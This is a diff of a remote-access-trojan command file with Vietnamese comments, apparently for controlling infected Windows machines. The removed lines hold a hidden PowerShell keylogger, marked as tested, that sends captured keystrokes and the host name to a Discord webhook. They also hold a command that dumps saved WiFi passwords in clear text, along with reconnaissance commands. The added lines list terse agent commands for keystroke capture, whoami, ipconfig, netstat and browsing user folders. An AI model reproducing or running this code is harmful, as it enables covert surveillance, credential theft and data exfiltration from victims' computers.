@@ -1,16 +1,10 @@
-# ===================== RAT COMMANDS =====================
-# KEYLOGGER HOẠT ĐỘNG - ĐÃ TEST
-powershell -nop -w hidden -exec bypass -c "$h='https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);}';while(1){$log=\"$env:TEMP\\keys.log\";$o='';for($i=8;$i-le255;$i++){if([K]::GetAsyncKeyState($i)-band0x8000){$o+=[char]$i;}};if($o){'['+(Get-Date -f'HH:mm:ss')+'] '+$o|Add-Content $log;};if(Test-Path $log){$c=Get-Content $log -Tail 20 -ErrorAction SilentlyContinue;if($c){$b=@{content='['+$env:COMPUTERNAME+'] Keys: '+$c}|ConvertTo-Json;try{Invoke-RestMethod -Uri $h -Method Post -Body $b -ContentType 'application/json' -ErrorAction SilentlyContinue}catch{};Remove-Item $log -Force -ErrorAction SilentlyContinue}};Start-Sleep -Seconds 5}"
+# File lệnh điều khiển từ xa
+# Mỗi dòng là một lệnh gửi đến agent
 
-# WiFi passwords - ĐÃ SỬA ESCAPING
-powershell -c "netsh wlan show profile name=* key=clear | Out-File \"$env:TEMP\wifi.txt\"; Get-Content \"$env:TEMP\wifi.txt\" | Select-String 'Key Content'"
-
-# System info
-powershell -c "echo 'HOST: '; echo $env:COMPUTERNAME; echo 'USER: '; echo $env:USERNAME"
-
-# Process list
-powershell -c "Get-Process | Where-Object {$_.ProcessName -match 'task|svch|rund|reg|wmi'} | Select-Object Name,Id,Path | Format-Table -AutoSize"
-
-# Disk info
-powershell -c "Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object DeviceID,@{Name='SizeGB';Expression={[math]::Round($_.Size/1GB,2)}},@{Name='FreeGB';Expression={[math]::Round($_.FreeSpace/1GB,2)}} | Format-Table"
-# =======================================================
+info
+keystrokes
+cmd whoami
+cmd ipconfig
+cmd netstat -an
+processes
+files C:\Users
